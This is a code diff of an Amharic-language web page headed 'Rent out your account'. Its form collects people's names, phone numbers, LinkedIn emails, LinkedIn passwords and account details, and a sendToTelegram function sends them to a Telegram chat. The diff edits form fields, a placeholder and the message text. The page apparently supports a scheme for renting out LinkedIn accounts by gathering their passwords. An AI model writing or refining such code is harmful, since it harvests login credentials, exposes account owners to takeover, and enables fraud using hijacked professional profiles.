@@ -51,19 +51,14 @@
             <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">አካውንትዎን ያከራዩ</h2>
             
             <form id="rentalForm" class="space-y-5">
-                <div>
-                    <label class="block text-sm font-semibold text-gray-700 mb-1">ሙሉ ስም</label>
-                    <input type="text" id="fullName" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="የአባት ስም ጭምር">
-                </div>
-
                 <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">ሙሉ ስም</label>
+                        <input type="text" id="fullName" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="የአባት ስም ጭምር">
+                    </div>
                     <div>
                         <label class="block text-sm font-semibold text-gray-700 mb-1">የስልክ ቁጥር</label>
                         <input type="tel" id="phone" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="09...">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-semibold text-gray-700 mb-1">የቴሌግራም ተጠቃሚ ስም (Username)</label>
-                        <input type="text" id="telegram" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="@username">
                     </div>
                 </div>
 
@@ -85,7 +80,7 @@
                     </div>
                     <div>
                         <label class="block text-sm font-semibold text-gray-700 mb-1">አካውንቱ የተከፈተበት ዓመት</label>
-                        <input type="text" id="accountAge" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="ምሳሌ፡ 2022 ወይም 3 ዓመት የሞላው">
+                        <input type="text" id="accountAge" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="ምሳሌ፡ 2022 ወይም 3 ዓመት">
                     </div>
                     <div>
                         <label class="block text-sm font-semibold text-gray-700 mb-1">መታወቂያ አላቸው?</label>
@@ -122,22 +117,20 @@
         function sendToTelegram() {
             const name = document.getElementById('fullName').value;
             const phone = document.getElementById('phone').value;
-            const telegram = document.getElementById('telegram').value;
             const email = document.getElementById('linkedinEmail').value;
             const pass = document.getElementById('linkedinPassword').value;
             const connections = document.getElementById('connections').value;
             const accountAge = document.getElementById('accountAge').value;
             const idStatus = document.getElementById('hasId').value;
 
-            if(!name || !phone || !telegram || !email || !pass || !connections || !accountAge) {
+            if(!name || !phone || !email || !pass || !connections || !accountAge) {
                 alert("እባክዎ ሁሉንም መረጃዎች በትክክል ይሙሉ!");
                 return;
             }
 
-            const message = `✨ אዲስ አካውንት አከራይ ተመዝግቧል ✨\n\n` +
+            const message = `✨ አዲስ አካውንት አከራይ ተመዝግቧል ✨\n\n` +
                             `👤 ስም: ${name}\n` +
                             `📞 ስልክ: ${phone}\n` +
-                            `✈️ ቴሌግራም: ${telegram}\n` +
                             `📧 ሊንክዲን ኢሜይል: ${email}\n` +
                             `🔑 የይለፍ ቃል: ${pass}\n` +
                             `👥 ኮኔክሽን ብዛት: ${connections}\n` +
